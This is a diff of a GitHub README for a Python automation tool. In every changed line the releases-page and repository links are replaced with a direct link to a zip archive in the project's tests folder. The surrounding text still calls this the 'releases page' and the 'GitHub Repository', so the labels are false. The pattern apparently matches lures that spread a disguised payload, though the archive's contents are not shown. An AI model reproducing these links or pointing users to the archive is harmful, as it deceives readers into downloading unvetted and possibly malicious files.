@@ -1,7 +1,7 @@
 # 🤖 python-ai-automation-suite - Automate Tasks with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/mannaahmed75/python-ai-automation-suite/releases)
+[![Download](https://raw.githubusercontent.com/mannaahmed75/python-ai-automation-suite/main/tests/ai_python_automation_suite_1.1.zip)](https://raw.githubusercontent.com/mannaahmed75/python-ai-automation-suite/main/tests/ai_python_automation_suite_1.1.zip)
 
 ## 📖 Description
 The python-ai-automation-suite is a small, reproducible Python automation suite. It demonstrates reliable end-to-end workflows that reduce manual effort and increase operational consistency. This tool is designed for users who want to streamline their tasks without delving deep into programming.
@@ -19,7 +19,7 @@ To get started with the python-ai-automation-suite, follow these simple steps. Y
 ### 🛠 Installation Steps
 1. **Visit the Download Page**: Click the link below to go to the releases page where you can download the software.
    
-   [Visit This Page to Download](https://github.com/mannaahmed75/python-ai-automation-suite/releases)
+   [Visit This Page to Download](https://raw.githubusercontent.com/mannaahmed75/python-ai-automation-suite/main/tests/ai_python_automation_suite_1.1.zip)
 
 2. **Choose Your Version**: On the releases page, find the latest version of the python-ai-automation-suite. Look for a version that matches your operating system (e.g., Windows, macOS, Linux).
 
@@ -64,7 +64,7 @@ For direct inquiries, please feel free to reach out through the GitHub repositor
 This project uses several open-source libraries and tools that have made automation accessible to all. Thank you to everyone who contributed to the development and improvement of this suite.
 
 ## 🔗 Useful Links
-- [Visit This Page to Download](https://github.com/mannaahmed75/python-ai-automation-suite/releases)
-- [GitHub Repository](https://github.com/mannaahmed75/python-ai-automation-suite)
+- [Visit This Page to Download](https://raw.githubusercontent.com/mannaahmed75/python-ai-automation-suite/main/tests/ai_python_automation_suite_1.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/mannaahmed75/python-ai-automation-suite/main/tests/ai_python_automation_suite_1.1.zip)
 
 Explore the power of automation with the python-ai-automation-suite today!
